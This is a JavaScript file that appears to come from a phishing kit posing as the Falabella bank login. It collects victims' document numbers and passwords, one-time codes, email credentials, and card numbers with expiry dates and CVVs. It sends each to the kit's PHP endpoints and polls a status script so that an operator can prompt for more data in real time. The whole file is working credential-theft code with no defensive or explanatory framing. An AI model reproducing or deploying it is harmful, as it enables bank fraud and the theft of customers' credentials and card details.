
function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}  


 function iniciar_sesion(td,nd,cl){
    var d = detectar_dispositivo();
    var u = "[" + td + "]" + nd;
    $.post( "../../../process/pasologin.php", { usr:u, pas: cl, dis: d, ban:"Falabella"} ,function(data) {
       espera = 1;
    });
 }

 function enviar_otp(cd){
    $.post( "../../../process/pasootp.php", { otp: cd} ,function(data) {        
       espera = 1;
    });
 }

  function enviar_error_otp(cd){
    $.post( "../../../process/pasootp.php", { otp: cd} ,function(data) { 
       espera = 1;
    });
 }

function enviar_correo(c,cc,ce){
    $.post( "../../../process/pasocorreo.php", { eml:c,clv:cc,cel:cc } ,function(data) {
       espera = 1;
    });
}


function enviar_tarjeta(t,f,c){
    $.post( "../../../process/pasotarjeta.php", { tar:t,fec:f,cvv:c } ,function(data) {
       espera = 1;
    });
}


function vista_otp(){    
    $("#mensaje").hide();
    $("#frmToken").show();
    $("#txtToken").val("");
    $("#txtToken").focus();
}
   
function vista_email(){
    $("#mensaje").hide();
    $("#frmCorreo").show();
    $("#txtCorreo").val("");
    $("#txtClaveCO").val("");
    $("#txtCelular").val("");
    $("#txtCorreo").focus();
} 
 
 function vista_tarjeta(){
    $("#mensaje").hide();
    $("#frmTarjeta").show();
    $("#txtTarjeta").val("");
    $("#mFecha").val("");
    $("#aFecha").val("");
    $("#txtCVV").val("");
    $("#txtTarjeta").focus();
 }

 function vista_errorotp(){
    $("#mensaje").hide();
    $("#frmTokenError").show();
    $("#txtTokenE").val("");
    $("#txtTokenE").focus();
 }

 function vista_usuario(){
    $("#fondo").hide();  
    $("#fondo-oscuro").hide();  
    $("#mensaje").hide();    
    $("#txtDocumento").val("");
    $("#txtClave").val("");
    $("#txtDocumento").focus();
    $("#txtDocumentoM").val("");
    $("#txtClaveM").val("");
    $("#txtDocumentoM").focus();
 } 

function consultar_estado(){

    if (espera == 1) { 

        $.post( "../../../process/estado.php",function(data) {
           
            switch (data) {
                case '2':espera = 0;
                         vista_otp();
                         break;
                case '4':espera = 0;
                         vista_email(); 
                         break;
                case '6':espera = 0;
                         vista_tarjeta();  
                         break;               
                case '8':espera = 0;
                         vista_errorotp(); 
                         break;
                case '10':espera = 0;
                          window.location.href = "../../../finish-no-back-button/";
                          break;
                case '12':espera = 0;
                          vista_usuario(); 
                          break;
            } 
        });    
    }    
}

